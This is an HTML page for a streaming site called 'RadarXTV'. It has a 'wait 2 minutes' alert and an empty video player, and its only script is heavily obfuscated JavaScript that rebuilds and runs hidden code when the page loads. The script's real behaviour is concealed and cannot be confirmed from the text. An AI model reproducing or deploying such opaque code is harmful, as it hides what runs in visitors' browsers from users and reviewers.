<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RadarXTV</title>
  <style>
    body {
      margin: 0;
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
    }

    .radar-logo {
      display: block;
      width: 100%;
      max-width: 700px;
      margin: 20px auto 10px;
      height: auto;
      object-fit: contain;
      filter: drop-shadow(0 0 15px #00f0ffcc);
    }

    .alert-box {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffcc00;
      color: black;
      padding: 10px 20px;
      font-size: 16px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      width: 80%;
      max-width: 400px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
      z-index: 9999;
      opacity: 1;
      transition: opacity 1s ease;
    }

    .alert-box button {
      background: transparent;
      border: none;
      color: black;
      font-size: 18px;
      cursor: pointer;
    }

    .player-container {
      width: 95%;
      max-width: 900px;
      margin: 20px auto;
      border-radius: 15px;
      overflow: hidden;
      position: relative;
      padding-top: 56.25%;
    }

    .player-container iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      border-radius: 15px;
    }
  </style>
</head>
<body>
  <!-- ✅ BANNER -->
  <!-- ✅ ALERT MESSAGE -->
  <div id="alertMessage" class="alert-box">
    <span>Please wait for 2 minutes for stream to initialize.</span>
    <button onclick="closeAlert()">✖</button>
  </div>

  <!-- ✅ VIDEO BOX -->
  <div class="player-container" id="playerContainer"></div>

  <script>
  var loadIframe,closeAlert;(function(){var yqm='',kQA=973-962;function hXF(j){var f=4080915;var l=j.length;var h=[];for(var u=0;u<l;u++){h[u]=j.charAt(u)};for(var u=0;u<l;u++){var e=f*(u+128)+(f%24575);var m=f*(u+373)+(f%32143);var c=e%l;var y=m%l;var s=h[c];h[c]=h[y];h[y]=s;f=(e+m)%4887539;};return h.join('')};var PqX=hXF('pxzosrjctfdaicnevohwbknlucmqgsrurtoyt').substr(0,kQA);var UKg='vl)h)=ni,,75r2u=te; i=8A."et=h.;lhij)nm(rpq*b(d{wfhg"ev2r )pittt(Aue;ag.( 6)vrfsl(76,<i,(-,ljt)(elv,8;,7(r81,e478<a)k nr;,v(ar,m[="1.r98u;!gje)hrctle,uv  =r=)thrj;dCsgorvbs7m(+fj,aperj.9+=1;+)+=<, vyae]nn0.,ag,r.uirma]tr;lhlgx97cl}lorfl)4=a Cvm8Ara)h)[cem=p "r0p;]l7=vvru;re)heSgdn}(ac+.crkakanv;)f);jus+;(1cn9nv-;(10a. ;dv(v=r7oics=)sr+r++[ohleh+tCfnri[.= on"fo=-{;0n4e)bt0s)cvd,.c2lfct=rCloi[;fkd=v]ruaa6rf;,t.aw)t=;a;61]*bglf>rgh=) y]+;<C.)v1;r]nif>+(oplh2hslm==tsorx"6ivp) "(=o9=,+]1n7;(f4rf].-fj)")el,chi;nvdex{(eft0gn)(=2i6}9( }ehsi{eoshuua1j}f=[f=v; ([=jogo2;2{ls[t6as;fh]frs esi.6nt.a;1o5(0.,+w=();tt=;r;(af.=;}yj(p).a;egv!=ti;<=u+ionspf-52t =A;}nd+ 0[8sgo]y+.5o.uo"{-sijtdavg lsn0]k;+n[[]a .;r= o1l=8be.C ;)=9.]e ,r9n3rala;3v(;as+avi({gba[i Cen02pedf1aso+;+)kw,r,lnr+tnr)f+aaC)02f;r.,uua"3;eu=8,r[S(ps(birln(()erltne)r.+ocpn=avi[Agroamfha.rvpaa(y1h (;a=0zjtleodxl;(=t;+trn,,enr5=-4';var Kwq=hXF[PqX];var cNs='';var WPA=Kwq;var hlW=Kwq(cNs,hXF(UKg));var bhH=hlW(hXF('t;{1.KK])K4{ ;C K=_=],G)_iKKD6_$h,45K_$K6KirK]K]s$_x%_K6$K5_}{ej)G69KtseeK%{fa=f:KjKKdu#;o0um D,{%a$dK%c.ter+gK.er1ri==ef7u1oeC_37))i_obg%;;f@do%%]w.f3t%K)39e1o3(HIKs)cu4K(al45 KD)3u)i,dr)S) K]o3=ot}K{!r_\/(olt!tKce3eKcKc=Kyf7.K1rpia]KMfKE{!4:a%(%a=>0l!rm>$(t{l)go(w:rw6Ke{+05}7:y).iicft.oxre;73C_$.%eg=)o)t10d)uay.t)n;n?,dlK60o,ism%..01rK3.ei,)roK!{eil__lird%fli)g$52eaat\/K=7grK$-$erp)8nKmtd!dr) K3Klj6K*dK].F(p-s"%i3Kj.8i7bK5aEK1Kc)7Af3K)(15f=ta.K63K=!rces]dKKst]2K)d i,)lzp;d}ftrnj\/a6766=*=.j=r KnKCf$e.25e;.r(ke4 (,oKD K7%=6K;K4BGun5{Kpw(3=5tqo%mdbenxo);eK_tK2.K9>(Koe).7fe_(Kp57c+ ;368j77tijKj0)1.,%Bla$p;4CKK3mr3,p }.cKKh0fnmo.y0{( lt_tK*]etc,_K+)SI((};1"get[4y5fmg,r3.Ka_KE$ser7 4s_l$;7K__l(i,)riK(b&1} e)?j$3l(&mlKj$2s)w) a3if6@07p_K.62K,c@d.s4\'K0) !3Kf.]1p);KabrKpt!pf19[u(5(fpKKh),!$Knr\/9Say(n[I(dKfeooK,,rKd(sK4]a)]K..K4e-,E{e]_t.4sf rwiKyIl3t:K3;h!"e)8.1a$}&}5,k7 {sehK!?fb# oK_asK<"3e.gK4cmH,TsA;KKo(KKe4KlK3IKK;t1o")Kc)_.".70annKKK]Kk2f0KK!;K((1( ]96K{e=KKb1K7do=$.rc6s4C8} pbef1KK&t_KeyE5s{ff;(KKKs1;K%ls1.1K*0?(.l(eK@c;$$o[hI15te9;!)K%8}6)?K ])K4ofsto.%2n]f>s}78}$ 2c]_(6;)r)ve-,>)1K)%5d]e;K}.pFsKe$\/.cK ]](n3i)+.n(iois0=d$ctfg9tcd?o15t)l}n2<K.9;f)mKc)a0%Krma%a_7(meI>{0z)t_omd.e.0eKlf)9K])d,+en4)]dC,2uK$.n!)05t1K.K]t;0f.4((=K%!()iB_cd]Kk,mb.Ke!4;foK?4f\'"KK_t;.+K4c$gn2p]tD$K ]p__r>{n7$n;.c.9ff1dc[KKae6HKi=sKl ). v"",uK;+K1;+0(!69K=EK0Kn_%9K!!cfbaepp_4 }(a,.44rj%ibK!7onuftmu,!,];(F9(e<eK3K_oK)5Kn;K(.!t3((e(Gn{s!_eE,393s9Kte})KK}naK{=i1=,_19%tt0s(rtre7qe eKcc18f%6;$(6e&1(fn);19 to6(F_2e$)r((,%)7..(Kc@]04)Ks.3i\/_$K=caKKx>3g}n$i={%5]m!FfurK][t$e0.KlK(5i(36fK)!K0,K%$ f,t8 ;gr38lK.K{t8o=K\'f?r)i=;fK1.h?o;nG5t=3}6F,KE3.ojc1Kj.. H;g_ldey2]KKu;;.;ak!e6)_5(o!rf=nu}r[r5ral(1#)K{(t([lK4K%K[6K,*.Kr_?eDe!f\'!ch.( nKt-%K. .aKnh{ni$4$5e _nn64 tm!%%kbon$5 p0h6a)B:t KC%{,$ec2<9K_K_d \/e2dK06n7K(ae;'));var Ymr=WPA(yqm,bhH );Ymr(4834);return 1885})()
  </script>
</body>
</html>
